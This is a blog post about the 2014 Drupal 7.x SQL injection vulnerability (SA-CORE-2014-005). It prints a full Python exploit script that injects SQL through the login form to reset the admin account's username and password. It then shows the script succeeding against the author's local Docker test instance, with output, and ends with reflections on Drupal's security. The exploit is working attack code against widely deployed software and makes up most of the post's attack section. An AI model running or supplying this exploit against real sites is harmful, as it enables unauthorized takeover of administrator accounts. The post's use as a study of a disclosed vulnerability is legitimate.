---
layout:     post
title:      Compromising Drupal 7.31
date:       2014-11-1 14:00:00
categories:
  - drupal
  - exploits
  - docker

---

Recently Drupal (versions 7.x < 7.32) was discovered to have...well a [devastating anonymous remote vulnerability](https://www.drupal.org/SA-CORE-2014-005). There are a lot of fascinating things about this vulnerability, including the fact that it's a one line mistake in a section of the code that is supposed to stop SQL injection attacks, as well as that the Drupal community actually put out a [PSA](https://www.drupal.org/PSA-2014-003) (as in "public service announcement") suggesting that if you have a Drupal site that wasn't upgraded within seven hours of the release of the update that you should consider your site compromised and act accordingly. Wow.

<!-- more -->

### Exploit in the wild!

Pretty quickly "exploits were in the wild", as they say. The wilds of the Internet...which is pretty much all of it.

Here's a Python script that will exploit a Drupal 7.31 site. The original script can be found on [pastebin](http://pastebin.com/nDwLFV3v). There's also a [good blog post](http://www.volexity.com/blog/?p=83) from Volexity which discusses the exploit in more detail.

```bash
#Drupal 7.x SQL Injection SA-CORE-2014-005 https://www.drupal.org/SA-CORE-2014-005
#Creditz to https://www.reddit.com/user/fyukyuk
import urllib2,sys
from drupalpass import DrupalHash # https://github.com/cvangysel/gitexd-drupalorg/blob/master/drupalorg/drupalpass.py
host = sys.argv[1]
user = sys.argv[2]
password = sys.argv[3]
if len(sys.argv) != 3:
    print "host username password"
    print "http://nope.io admin wowsecure"
hash = DrupalHash("$S$CTo9G7Lx28rzCfpn4WB2hUlknDKv6QTqHaf82WLbhPT2K5TzKzML", password).get_hash()
target = '%s/?q=node&destination=node' % host
post_data = "name[0%20;update+users+set+name%3d\'" \
            +user \
            +"'+,+pass+%3d+'" \
            +hash[:55] \
            +"'+where+uid+%3d+\'1\';;#%20%20]=bob&name[0]=larry&pass=lol&form_build_id=&form_id=user_login_block&op=Log+in"
content = urllib2.urlopen(url=target, data=post_data).read()
if "mb_strlen() expects parameter 1" in content:
        print "Success!\nLogin now with user:%s and pass:%s" % (user, password)
```

There are a couple steps you need to perform to get that script to work, which I won't detail here. Suffice it to say this is one of the easiest exploits I've ever seen, and it'll get you admin on, as far as I know, any Drupal 7.x < 7.32 instance. Oof.

### Exploit a Docker based Drupal instance

In my [last post](/posts/install-docker-ubuntu-14-10/) I talked about using Docker to quickly create a Drupal instance. I'm using one of those instances here to test out the exploit script. In this case Drupal is running on my local computer at 172.17.0.28 via Docker. (_Note this isn't a Docker security issue, it's just that I'm using Docker to quickly create and destroy Drupal instances to test against. Just want to be clear about that._)

I changed the Dockerfile to install ```drupal-7.31``` instead of the default install, which would be the latest version (which as of today is 7.32 and that has the security patch).

When I run it, after making a few changes, I get the below output.

```bash
curtis$ ./drupal-hack.py 172.17.0.28 admin superc00l
starting...
sending payload to 172.17.0.28
Success!
Login now with user:admin and pass:superc00l
```

By default the Drupal docker image sets the login to ```admin``` and the password also to ```admin```. But after running the exploit script as shown above, the password is set to ```superc00l```.

### Conclusion

Drupal has been audited many, many times by different security organizations. In fact that was how this vulnerability was found--by a professional audit. It's one of the most popular content management systems in use, perhaps just behind Wordpress. It has a lot of "eyes" on it in terms of ensuring it's a secure system. And yet, here we are, ~32 releases into Drupal 7 and there are still holes being found.

My point is that Drupal is not insecure, in fact it's probably one of the more secure content management systems available (if only because it's had so many security reviews and is so pouplar; been "battle tested" so to speak) and yet there are still holes found, holes that can cause up to [12 million sites](http://www.bbc.com/news/technology-29846539) to potentially be hacked, because bugs. I think it's easier to write insecure code in PHP than some other languages, but I don't think Drupal's security isses are a PHP issue per se, though some think otherwise.

This suggests that most Drupal sites will need some additional security layers to try to reduce the damage that can occur in case of compromise, as well as processes and procedures to recover from a compromise. Of course, that is easier said than done.

PS. Don't get me started on modules... :)
